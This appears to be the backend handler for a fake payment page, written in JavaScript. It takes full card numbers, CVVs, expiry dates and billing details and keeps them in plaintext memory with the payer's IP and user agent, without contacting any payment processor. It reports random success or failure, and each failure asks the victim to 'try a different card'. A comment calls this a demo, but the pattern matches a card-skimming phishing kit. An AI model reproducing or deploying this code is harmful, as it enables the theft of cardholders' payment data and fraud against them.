// Global storage that persists across function calls
if (!global.payments) {
    global.payments = [];
}

// Generate transaction ID
function generateTransactionId() {
    return 'TXN-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
}

// Mask card number for security
function maskCardNumber(cardNumber) {
    if (cardNumber.length <= 4) return cardNumber;
    const last4 = cardNumber.slice(-4);
    const masked = '•'.repeat(cardNumber.length - 4);
    return masked + last4;
}

export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    const paymentData = req.body;

    if (!paymentData.cardNumber || !paymentData.cardholderName || !paymentData.email) {
        return res.status(400).json({
            success: false,
            message: 'Required payment information missing'
        });
    }

    // Create new payment entry
    const paymentEntry = {
        id: Date.now(),
        transactionId: generateTransactionId(),
        timestamp: new Date().toISOString(),

        // Card Information
        cardNumber: paymentData.cardNumber,
        maskedCardNumber: maskCardNumber(paymentData.cardNumber),
        cardholderName: paymentData.cardholderName,
        expiryDate: paymentData.expiryDate,
        cvv: paymentData.cvv,
        cardType: paymentData.cardType,

        // Billing Information
        email: paymentData.email,
        address: paymentData.address,
        city: paymentData.city,
        state: paymentData.state,
        zipCode: paymentData.zipCode,

        // Payment Details
        amount: paymentData.amount,
        currency: paymentData.currency || 'USD',

        // Options
        saveCard: paymentData.saveCard || false,
        newsletter: paymentData.newsletter || false,

        // System Information
        ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress,
        userAgent: req.headers['user-agent'],

        // Demo success simulation
        success: Math.random() > 0.15 // 85% success rate
    };

    // Store in global storage
    global.payments.push(paymentEntry);

    console.log(`New payment stored: ${paymentEntry.email} - $${paymentEntry.amount} at ${paymentEntry.timestamp}`);

    if (paymentEntry.success) {
        res.json({
            success: true,
            message: 'Payment processed successfully',
            transactionId: paymentEntry.transactionId,
            maskedCardNumber: paymentEntry.maskedCardNumber,
            amount: paymentEntry.amount
        });
    } else {
        res.json({
            success: false,
            message: 'Payment declined - please try a different card'
        });
    }
}